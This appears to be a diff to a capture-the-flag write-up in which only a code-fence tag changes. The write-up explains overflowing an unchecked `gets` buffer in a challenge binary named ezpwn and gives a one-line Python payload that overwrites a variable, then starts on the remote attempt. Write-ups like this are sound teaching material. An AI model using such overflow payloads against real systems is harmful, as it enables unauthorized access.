@@ -10,7 +10,7 @@ We have no boundary check for `gets` function so we tried to overflow filling ga
 So we followed this two steps:
 
 * create stub `flag.txt` 
-* exploit with command: ```bash $ (python -c 'print "a"*24+"\x01"';cat)|./ezpwn```
+* exploit with command: ``` $ (python -c 'print "a"*24+"\x01"';cat)|./ezpwn```
 
 The exploit worked perfectly, after that we tried in remote:
 ```bash
